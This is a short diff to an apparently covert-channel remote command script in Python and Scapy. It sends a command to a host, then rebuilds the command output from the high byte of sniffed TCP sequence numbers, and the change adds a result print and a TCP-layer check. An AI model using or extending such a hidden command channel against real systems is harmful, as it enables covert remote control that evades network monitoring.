@@ -415,9 +415,12 @@ def terminal(address, port, command):
 		send(commandPacket, verbose=0)
 	
 		while True:
+			print result + "\n"
 			dPacket = sniff(filter="tcp and src port " + str(port) + " and ip src " + address, count=1, timeout=30)
 			if len(dPacket) == 0:
 				break
+			if dPacket[0].haslayer(TCP) != True:
+				continue
 			if dPacket[0][TCP].flags == 1:
 				break
 			result = result + chr(0x000000FF&(dPacket[0][TCP].seq>>24))
